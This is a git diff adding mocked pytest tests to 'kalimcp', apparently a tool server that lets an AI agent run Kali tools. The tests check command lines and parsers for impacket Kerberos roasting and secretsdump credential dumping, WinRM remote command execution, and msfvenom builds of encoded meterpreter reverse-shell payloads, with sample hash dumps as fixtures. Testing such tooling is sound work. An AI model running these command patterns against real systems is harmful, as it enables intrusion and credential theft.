@@ -13,6 +13,7 @@ targets (127.0.0.1, example.com) to avoid the refuse path.
 
 from __future__ import annotations
 
+from pathlib import Path
 from unittest.mock import AsyncMock, patch
 
 import pytest
@@ -22,9 +23,11 @@ from kalimcp.tools import (
     gobuster,
     hashcat,
     hydra,
+    impacket,
     john,
     ldap,
     medusa,
+    msfvenom,
     netexec,
     nikto,
     nmap,
@@ -34,6 +37,7 @@ from kalimcp.tools import (
     sqlmap,
     sslscan,
     whatweb,
+    winrm,
 )
 
 
@@ -1392,3 +1396,300 @@ async def test_hashcat_parsed_field_extracts_cracked():
     by_pw = {c["password"] for c in cracked}
     assert by_pw == {"hunter2", "s3cret"}
     assert parsed["total_hashes"] == 2
+
+
+# ---------- impacket suite ----------
+
+_GETNPUSERS_SAMPLE = """Impacket v0.11.0 - Copyright 2023 Fortra
+
+$krb5asrep$23$alice@CORP.LOCAL:e8ffa83d68f97c8d...c0:1234567890abcdef
+$krb5asrep$23$bob@CORP.LOCAL:7c5d11ab09a32...:fedcba0987654321
+"""
+
+_GETUSERSPNS_SAMPLE = """Impacket v0.11.0
+
+ServicePrincipalName        Name           MemberOf  PasswordLastSet      LastLogon  Delegation
+--------------------------  -------------  --------  -------------------  ---------  ----------
+MSSQLSvc/db.corp.local:1433 sql_service              2024-01-15 12:00     never
+
+$krb5tgs$23$*sql_service$CORP.LOCAL$MSSQLSvc/db.corp.local~1433*$abc...$def...
+"""
+
+_SECRETSDUMP_SAMPLE = """Impacket v0.11.0
+
+[*] Service RemoteRegistry is in stopped state
+[*] Target system bootKey: 0xabcd1234
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+alice:1000:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
+[*] Dumping cached domain logon information
+[*] Kerberos keys grabbed
+alice:aes256-cts-hmac-sha1-96:abc1234...
+[*] Cleartext passwords stored in the LSA
+"""
+
+
+@pytest.mark.asyncio
+async def test_impacket_getnpusers_argv():
+    with patch("kalimcp.tools.impacket.run.run", new=AsyncMock(return_value=_fake_result())) as m:
+        await impacket.getnpusers(target="corp.local", dc_ip="10.0.0.1", user_list="/tmp/u.txt")
+    argv = m.call_args.args[0]
+    assert argv[0] == "impacket-GetNPUsers"
+    assert "corp.local/" in argv
+    assert "-format" in argv and argv[argv.index("-format") + 1] == "hashcat"
+    assert "-usersfile" in argv and argv[argv.index("-usersfile") + 1] == "/tmp/u.txt"
+    assert "-no-pass" in argv
+    assert "-dc-ip" in argv and argv[argv.index("-dc-ip") + 1] == "10.0.0.1"
+
+
+@pytest.mark.asyncio
+async def test_impacket_getnpusers_parses_asrep_hashes():
+    fake = _fake_result(stdout=_GETNPUSERS_SAMPLE)
+    with patch("kalimcp.tools.impacket.run.run", new=AsyncMock(return_value=fake)):
+        result = await impacket.getnpusers(target="corp.local", user_list="/u")
+    parsed = result["parsed"]
+    users = {u["user"] for u in parsed["users_no_preauth"]}
+    assert users == {"alice", "bob"}
+
+
+@pytest.mark.asyncio
+async def test_impacket_getuserspns_argv_password():
+    with patch("kalimcp.tools.impacket.run.run", new=AsyncMock(return_value=_fake_result())) as m:
+        await impacket.getuserspns(
+            target="corp.local",
+            username="alice",
+            password="hunter2",
+            dc_ip="10.0.0.1",
+        )
+    argv = m.call_args.args[0]
+    assert argv[0] == "impacket-GetUserSPNs"
+    assert "corp.local/alice:hunter2" in argv
+    assert "-request" in argv
+
+
+@pytest.mark.asyncio
+async def test_impacket_getuserspns_argv_nthash_omits_password():
+    with patch("kalimcp.tools.impacket.run.run", new=AsyncMock(return_value=_fake_result())) as m:
+        await impacket.getuserspns(
+            target="corp.local",
+            username="alice",
+            nthash="aad3b435b51404eeaad3b435b51404ee",
+        )
+    argv = m.call_args.args[0]
+    # username token has no embedded password.
+    assert "corp.local/alice" in argv
+    assert "-hashes" in argv
+
+
+@pytest.mark.asyncio
+async def test_impacket_getuserspns_parses_tgs_hash():
+    fake = _fake_result(stdout=_GETUSERSPNS_SAMPLE)
+    with patch("kalimcp.tools.impacket.run.run", new=AsyncMock(return_value=fake)):
+        result = await impacket.getuserspns(
+            target="corp.local",
+            username="alice",
+            password="x",
+        )
+    parsed = result["parsed"]
+    assert len(parsed["spns"]) == 1
+    spn = parsed["spns"][0]
+    assert spn["user"] == "sql_service"
+    assert "MSSQLSvc/db.corp.local" in spn["spn"]
+
+
+@pytest.mark.asyncio
+async def test_impacket_secretsdump_argv_with_password():
+    with patch("kalimcp.tools.impacket.run.run", new=AsyncMock(return_value=_fake_result())) as m:
+        await impacket.secretsdump(
+            target="dc.corp.local",
+            username="admin",
+            password="hunter2",
+            just_dc=True,
+        )
+    argv = m.call_args.args[0]
+    assert argv[0] == "impacket-secretsdump"
+    assert "admin:hunter2@dc.corp.local" in argv
+    assert "-just-dc" in argv
+
+
+@pytest.mark.asyncio
+async def test_impacket_secretsdump_missing_creds_returns_error():
+    with patch("kalimcp.tools.impacket.run.run", new=AsyncMock()) as m:
+        result = await impacket.secretsdump(target="dc.corp.local", username="admin")
+    m.assert_not_called()
+    assert result["exit_code"] == -1
+
+
+@pytest.mark.asyncio
+async def test_impacket_secretsdump_parses_hash_lines():
+    fake = _fake_result(stdout=_SECRETSDUMP_SAMPLE)
+    with patch("kalimcp.tools.impacket.run.run", new=AsyncMock(return_value=fake)):
+        result = await impacket.secretsdump(
+            target="dc.corp.local",
+            username="admin",
+            password="hunter2",
+        )
+    parsed = result["parsed"]
+    by_user = {s["principal"]: s for s in parsed["secrets"]}
+    assert "Administrator" in by_user
+    assert by_user["Administrator"]["rid"] == 500
+    assert by_user["Administrator"]["nthash"] == "31d6cfe0d16ae931b73c59d7e0c089c0"
+    assert by_user["alice"]["rid"] == 1000
+
+
+@pytest.mark.asyncio
+async def test_impacket_smbclient_pipes_command_via_stdin():
+    with patch("kalimcp.tools.impacket.run.run", new=AsyncMock(return_value=_fake_result())) as m:
+        await impacket.smbclient(
+            target="host", username="alice", password="x", command="shares",
+        )
+    argv = m.call_args.args[0]
+    assert argv[0] == "impacket-smbclient"
+    assert "alice:x@host" in argv
+    # Command is delivered over stdin, not argv.
+    stdin = m.call_args.kwargs.get("stdin")
+    assert stdin is not None
+    assert b"shares" in stdin
+    assert b"exit" in stdin
+
+
+# ---------- winrm_exec ----------
+
+
+@pytest.mark.asyncio
+async def test_winrm_exec_argv_uses_netexec_winrm_X():
+    with patch("kalimcp.tools.winrm.run.run", new=AsyncMock(return_value=_fake_result())) as m:
+        await winrm.execute(
+            target="10.0.0.5",
+            username="alice",
+            password="hunter2",
+            command="whoami",
+        )
+    argv = m.call_args.args[0]
+    assert argv[:3] == ["netexec", "winrm", "10.0.0.5"]
+    assert "-u" in argv and argv[argv.index("-u") + 1] == "alice"
+    assert "-p" in argv and argv[argv.index("-p") + 1] == "hunter2"
+    assert "-X" in argv and argv[argv.index("-X") + 1] == "whoami"
+
+
+@pytest.mark.asyncio
+async def test_winrm_exec_missing_creds_returns_error():
+    with patch("kalimcp.tools.winrm.run.run", new=AsyncMock()) as m:
+        result = await winrm.execute(
+            target="10.0.0.5",
+            username="alice",
+            command="whoami",
+        )
+    m.assert_not_called()
+    assert result["exit_code"] == -1
+
+
+_WINRM_OUTPUT_SAMPLE = """WINRM       10.0.0.5        5985   WS01             [*] Windows 10 Pro
+WINRM       10.0.0.5        5985   WS01             [+] alice:hunter2 (Pwn3d!)
+nt authority\\system
+WS01\\administrator
+"""
+
+
+@pytest.mark.asyncio
+async def test_winrm_exec_parser_keeps_command_output_drops_banner():
+    fake = _fake_result(stdout=_WINRM_OUTPUT_SAMPLE)
+    with patch("kalimcp.tools.winrm.run.run", new=AsyncMock(return_value=fake)):
+        result = await winrm.execute(
+            target="10.0.0.5",
+            username="alice",
+            password="hunter2",
+            command="whoami",
+        )
+    parsed = result["parsed"]
+    # Banner / pwn3d lines stripped; command output retained.
+    assert parsed["output_lines"] == [
+        "nt authority\\system",
+        "WS01\\administrator",
+    ]
+
+
+# ---------- msfvenom ----------
+
+
+@pytest.mark.asyncio
+async def test_msfvenom_argv_shape(tmp_path, monkeypatch):
+    monkeypatch.setenv("HOME", str(tmp_path))
+    with patch("kalimcp.tools.msfvenom.run.run",
+               new=AsyncMock(return_value=_fake_result())) as m:
+        await msfvenom.generate(
+            target="win10-corp",
+            payload="windows/x64/meterpreter/reverse_tcp",
+            lhost="10.0.0.1",
+            lport=4444,
+            format="exe",
+        )
+    argv = m.call_args.args[0]
+    assert argv[0] == "msfvenom"
+    assert "-p" in argv and argv[argv.index("-p") + 1] == "windows/x64/meterpreter/reverse_tcp"
+    assert "LHOST=10.0.0.1" in argv
+    assert "LPORT=4444" in argv
+    assert "-f" in argv and argv[argv.index("-f") + 1] == "exe"
+    # No encoder passed → no -e in argv.
+    assert "-e" not in argv
+
+
+@pytest.mark.asyncio
+async def test_msfvenom_encoder_flags(tmp_path, monkeypatch):
+    monkeypatch.setenv("HOME", str(tmp_path))
+    with patch("kalimcp.tools.msfvenom.run.run",
+               new=AsyncMock(return_value=_fake_result())) as m:
+        await msfvenom.generate(
+            target="win10-corp",
+            payload="windows/shell_reverse_tcp",
+            lhost="10.0.0.1",
+            format="exe",
+            encoder="x86/shikata_ga_nai",
+            iterations=5,
+            badchars="\\x00\\x0a",
+        )
+    argv = m.call_args.args[0]
+    assert "-e" in argv and argv[argv.index("-e") + 1] == "x86/shikata_ga_nai"
+    assert "-i" in argv and argv[argv.index("-i") + 1] == "5"
+    assert "-b" in argv and argv[argv.index("-b") + 1] == "\\x00\\x0a"
+
+
+@pytest.mark.asyncio
+async def test_msfvenom_parsed_includes_path_and_sha256(tmp_path, monkeypatch):
+    """Simulate msfvenom writing payload bytes to the configured -o path."""
+    monkeypatch.setenv("HOME", str(tmp_path))
+
+    payload_bytes = b"\x90" * 256 + b"shellcode"
+
+    async def fake_run(argv, *, timeout=None, stdin=None):
+        # Find the -o output path and write our fake payload to it.
+        idx = argv.index("-o")
+        out_path = argv[idx + 1]
+        Path(out_path).write_bytes(payload_bytes)
+        return {
+            "argv": argv, "exit_code": 0, "elapsed_s": 0.01,
+            "stdout": "", "stderr": "",
+            "truncated": False, "timed_out": False,
+        }
+
+    with patch("kalimcp.tools.msfvenom.run.run", side_effect=fake_run):
+        result = await msfvenom.generate(
+            target="win10-corp",
+            payload="windows/x64/meterpreter/reverse_tcp",
+            lhost="10.0.0.1",
+            format="exe",
+        )
+    assert "parsed" in result, f"result missing parsed; got: {result!r}"
+    parsed = result["parsed"]
+    assert parsed["size_bytes"] == len(payload_bytes)
+    assert parsed["format"] == "exe"
+    assert parsed["payload"] == "windows/x64/meterpreter/reverse_tcp"
+    assert parsed["lhost"] == "10.0.0.1"
+    assert parsed["lport"] == 4444
+    # sha256 should be 64 hex chars and the path should end with that.
+    assert len(parsed["sha256"]) == 64
+    assert parsed["sha256"] in parsed["path"]
+    assert parsed["path"].endswith(".exe")
+    # Final file exists and matches sha256.
+    final = Path(parsed["path"])
+    assert final.exists()
